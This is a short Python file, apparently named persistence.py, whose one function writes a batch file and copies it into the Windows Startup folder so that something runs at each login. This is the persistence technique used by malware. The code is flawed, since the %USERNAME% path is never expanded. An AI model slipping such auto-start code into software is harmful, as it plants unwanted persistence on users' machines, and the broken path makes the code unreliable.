# persistence.py
import os
import shutil

def add_to_startup(file_path=None):
    if file_path is None:
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = os.path.join(file_path, "start_up.bat")
    with open(bat_path, "w+") as bat_file:
        bat_file.write(f'start {file_path}')
    shutil.copy(bat_path, r"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
